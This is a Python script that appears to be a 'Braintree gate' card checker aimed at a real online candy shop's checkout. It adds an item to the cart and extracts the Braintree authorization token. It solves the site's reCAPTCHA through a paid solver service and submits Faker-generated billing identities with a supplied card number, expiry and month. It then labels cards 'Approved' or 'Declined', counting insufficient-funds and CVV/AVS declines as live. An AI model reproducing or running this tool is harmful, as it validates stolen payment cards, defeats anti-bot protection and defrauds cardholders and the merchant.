import aiohttp, uuid, traceback, base64, urllib.parse, os
from faker import Faker
import capsolver
import asyncio
from functions.functions import ProxyRandom
fake = Faker()

@staticmethod
def braintree_generate_correlation_id():
        return str(uuid.uuid4())

email = str(uuid.uuid4())[:8]+"@gmail.com"


async def b3_gate(cc,mes,ano,cvv,proxyg):
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.7',
                'if-modified-since': 'Sun, 10 Nov 2024 05:24:59 GMT',
                'priority': 'u=0, i',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }

            response = await session.get('https://www.sweetservices.com/Mini-Mini-Chicles.html', headers=headers)
            r1 = await response.text()

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'xid_e1726=a53d7e3f2259c79ed2b2b2f21230d937; store_language=en; products_layout=Grid; RefererCookie=https%3A%2F%2Fwww.sweetservices.com%2F',
                'origin': 'https://www.sweetservices.com',
                'priority': 'u=1, i',
                'referer': 'https://www.sweetservices.com/Mini-Mini-Chicles.html',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'mode': 'add',
                'productid': '21371',
                'cat': '',
                'page': '',
                'amount': '1',
            }

            response = await session.post('https://www.sweetservices.com/cart.php', headers=headers, data=data)
            r1 = await response.text()

            with open('B3AVS1.html', 'w', encoding='utf-8') as f:
                f.write(r1)


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.7',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'xid_e1726=a53d7e3f2259c79ed2b2b2f21230d937; store_language=en; products_layout=Grid; RefererCookie=https%3A%2F%2Fwww.sweetservices.com%2F',
                'priority': 'u=0, i',
                'referer': 'https://www.sweetservices.com/Mini-Mini-Chicles.html',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }

            params = {
                'mode': 'checkout',
            }

            response = await session.get('https://www.sweetservices.com/cart.php', params=params, headers=headers)
            r2 = await response.text()


            with open('B3AVS2.html', 'w', encoding='utf-8') as f:
                f.write(r2)
            paymentid = r2.split("paymentid:'")[1].split("'")[0]
            bearer = r2.split('token:"')[1].split('"')[0]
            bearer = base64.b64decode(bearer)
            bearer = bearer.decode('utf-8')	
            bearer = bearer.split('"authorizationFingerprint":"')[1].split('"')[0]
            g_response = (await asyncio.to_thread(lambda: capsolver.solve({
            "type": "ReCaptchaV2TaskProxyLess",
            "websiteKey": '6LeFP3AUAAAAAC6kYnLH607G45WbDs-jh38Scbx9',
            "websiteURL": 'https://www.sweetservices.com/',
            })))['gRecaptchaResponse']

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'xid_e1726=a53d7e3f2259c79ed2b2b2f21230d937; store_language=en; products_layout=Grid; RefererCookie=https%3A%2F%2Fwww.sweetservices.com%2F',
                'origin': 'https://www.sweetservices.com',
                'priority': 'u=1, i',
                'referer': 'https://www.sweetservices.com/cart.php?mode=checkout',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'mode': 'checkout',
            }

            data = {
                'usertype': 'C',
                'anonymous': 'Y',
                'pending_membershipid': '0',
                'uname': '',
                'password_is_modified': 'N',
                'passwd1': '',
                'passwd2': '',
                'address_book[B][firstname]': fake.first_name(),
                'address_book[B][lastname]': fake.last_name(),
                'company': '',
                'address_book[B][address]': fake.street_address(),
                'address_book[B][address_2]': '',
                'address_book[B][city]': fake.city(),
                'address_book[B][state]': fake.state(),
                'address_book[B][country]': 'US',
                'address_book[B][zipcode]': fake.zipcode,
                'address_book[B][phone]': fake.phone_number(),
                'address_book[B][no_address]': '',
                'email': email,
                'address_book[S][firstname]': '',
                'address_book[S][lastname]': '',
                'address_book[S][address]': '',
                'address_book[S][address_2]': '',
                'address_book[S][city]': '',
                'address_book[S][state]': fake.state(),
                'address_book[S][country]': 'US',
                'address_book[S][zipcode]': '',
                'address_book[S][phone]': '',
                'address_book[S][no_address]': '',
                'g-recaptcha-response': g_response,
            }

            response = await session.post('https://www.sweetservices.com/cart.php', params=params, headers=headers, data=data)
            r3 = await response.text()

            with open('B3AVS3.html', 'w', encoding='utf-8') as f:
                f.write(r3)


            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.7',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'script',
                'sec-fetch-mode': 'no-cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }

            response = await session.get(f'https://api.braintreegateway.com/merchants/452xrbkwrwq4q43b/client_api/v1/payment_methods/credit_cards?authorizationFingerprint={bearer}&sharedCustomerIdentifierType=undefined&share=false&&creditCard%5Bnumber%5D={cc}&creditCard%5BexpirationMonth%5D={mes}&creditCard%5BexpirationYear%5D={ano}&creditCard%5Bcvv%5D=&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_method=POST&callback=callback_json5c6b2ce4fbec42059b1e12d6c5e9620f', headers=headers)
            r4 = await response.text()

            print(r4)

            tokenb3 = r4.split('"nonce":"')[1].split('"')[0]


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.7',
                'cache-control': 'max-age=0',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'xid_e1726=a53d7e3f2259c79ed2b2b2f21230d937; store_language=en; products_layout=Grid; RefererCookie=https%3A%2F%2Fwww.sweetservices.com%2F',
                'origin': 'https://www.sweetservices.com',
                'priority': 'u=0, i',
                'referer': 'https://www.sweetservices.com/cart.php?mode=checkout',
                'sec-ch-ua': '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }

            data = {
                'payment_method_nonce': tokenb3,
                'paymentid': paymentid,
                'action': 'place_order',
                'payment_method': 'Credit or Debit card',
                'Customer_Notes': '',
                'accept_terms': 'Y',
                'terms': 'Y',
                'device_data': '{"device_session_id":"4df872e672d22e6b078d50fae100282e","fraud_merchant_id":"600000","correlation_id":"'+braintree_generate_correlation_id()+'"}',
            }

            response = await session.post('https://www.sweetservices.com/payment/payment_cc.php', headers=headers, data=data)
            r4 = await response.text()

            with open('B3AVS4.html', 'w', encoding='utf-8') as f:
                f.write(r4)


            cvv2 = ''
            avs = 'None' 


            if 'error_message.php' not in r4:
                res = 'Approved ✅'
                mensaje = 'Charged $25'
            else:


                mensaje = r4.split('please follow this link: <a href="')[1].split('"')[0]
                mensaje = urllib.parse.unquote(mensaje)
                mensaje1 = mensaje.replace('+', ' ')


                if 'Additional processor response' in mensaje1:
                    mensaje = mensaje1.split('Processor response text: ')[1].split('Additional')[0].strip()
                else:
                    mensaje = mensaje1.split('Processor response text: ')[1].split('BIN')[0].strip()
                
                try:
                    hostcode = mensaje1.split('Processor response code: ')[1].split('Processor')[0].strip()
                    hostcode = f'({hostcode}) '
                except:
                    hostcode = 'None'


                try:
                    aditional = mensaje1.split('Additional processor response: ')[1].split('BIN')[0].strip()
                    aditional = f' : {aditional}'
                except:
                    aditional = 'None'


                try:
                    avs = mensaje1.split('AVS Postal code response code: ')[1].split('AVS')[0].strip()
                except:
                    pass


                if 'Card Issuer Declined' in mensaje:
                    res = 'Approved ✅'
                elif 'Insufficient Funds' in mensaje:
                    res = 'Approved ✅'
                elif 'cvv' in mensaje:
                    res = 'Approved ✅'
                elif 'avs' in mensaje:
                    res = 'Approved ✅'    
                else:
                    res = 'Declined ❌'


                mensaje = f'{hostcode}{mensaje}{aditional}'
            print(res, mensaje)

            return res, mensaje, avs, cvv2